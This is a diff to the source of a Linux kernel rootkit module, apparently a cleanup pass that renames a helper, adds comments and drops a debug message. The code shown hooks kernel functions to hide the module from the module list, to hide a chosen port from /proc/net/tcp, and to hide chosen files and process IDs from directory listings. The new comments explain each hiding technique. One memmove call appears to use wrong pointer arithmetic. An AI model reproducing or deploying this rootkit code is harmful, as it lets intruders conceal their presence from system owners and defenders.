@@ -35,7 +35,7 @@ static asmlinkage int (*old_tcp4_seq_show)(struct seq_file *seq, void *v);
 static asmlinkage int new_tcp4_seq_show(struct seq_file *seq, void *v);
 
 
-int hide_string_from_dirent(struct linux_dirent64* dirent, char* string, int len);
+int hide_entry_from_dirent(struct linux_dirent64* dirent, char* entry_name, int len);
 
 
 
@@ -101,10 +101,11 @@ static int __init rootkit_enter(void) {
 
 	return 0;
 }
+
 static void __exit rootkit_exit(void) {
 
 	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
-	printk(KERN_INFO "rootkit stopped\n");
+	printk(KERN_INFO "rootkit: stopped\n");
 }
 
 
@@ -133,7 +134,11 @@ asmlinkage int new_ip_rcv(struct sk_buff *skb, struct net_device *dev, struct pa
 }
 
 
-
+/*
+ * a hook to m_show kernel function, which prints information about an LKM.
+ * checks if the module it attempts to print is the  rootkit.
+ * if it is, don't call original function- return an empty string.
+ */
 static asmlinkage int new_m_show(struct seq_file *m, void *p)
 {
 	struct module *mod = list_entry(p, struct module, list);
@@ -146,6 +151,10 @@ static asmlinkage int new_m_show(struct seq_file *m, void *p)
 }
 
 
+/* A hook to tcp4_seq_show function, which is called when reading from /proc/net/tcp.
+ * Checks whether the connection it attempts to print contains info about the port we want to hide.
+ * If it does, return an empty string instead.
+ */
 static asmlinkage int new_tcp4_seq_show(struct seq_file *seq, void *v)
 {
 	__u16 srcp;
@@ -214,11 +223,11 @@ static asmlinkage int new_getdents64(const struct pt_regs *regs)
 
 	if (hide_file)
 	{
-		len = hide_string_from_dirent(dirent_kern, file_to_hide, len);
+		len = hide_entry_from_dirent(dirent_kern, file_to_hide, len);
 	}
 	if (hide_pid)
 	{
-		len = hide_string_from_dirent(dirent_kern, pid_to_hide, len);
+		len = hide_entry_from_dirent(dirent_kern, pid_to_hide, len);
 	}
 
 		
@@ -231,7 +240,11 @@ static asmlinkage int new_getdents64(const struct pt_regs *regs)
 		return len;	
 }
 
-int hide_string_from_dirent(struct linux_dirent64* dirent, char* string, int len)
+/*
+ * Hides an with d_name={entry_name} from given linux_dirent64 struct.
+ * Returns the new length after the operation.  
+ */
+int hide_entry_from_dirent(struct linux_dirent64* dirent, char* entry_name, int len)
 {
 	struct linux_dirent64  *curr_ent = NULL, *prev_ent = NULL; 
 
@@ -245,11 +258,12 @@ int hide_string_from_dirent(struct linux_dirent64* dirent, char* string, int len
 	{
 		prev_ent = curr_ent;
 		curr_ent = (void*)dirent + offset;
-		if (strcmp(string,curr_ent->d_name) == 0)
+		if (strcmp(entry_name,curr_ent->d_name) == 0)
 		{	
-			printk(KERN_INFO "found what we want to hide!: %s\n",string);
 			if (offset == 0 )// special case
 			{
+				//substract entry length from total length,
+				//and move the rest of the structs back in memory entry-length times to cover the first entry.
 				new_len -= curr_ent->d_reclen;
 				memmove(curr_ent, curr_ent+curr_ent->d_reclen, new_len);
 			}
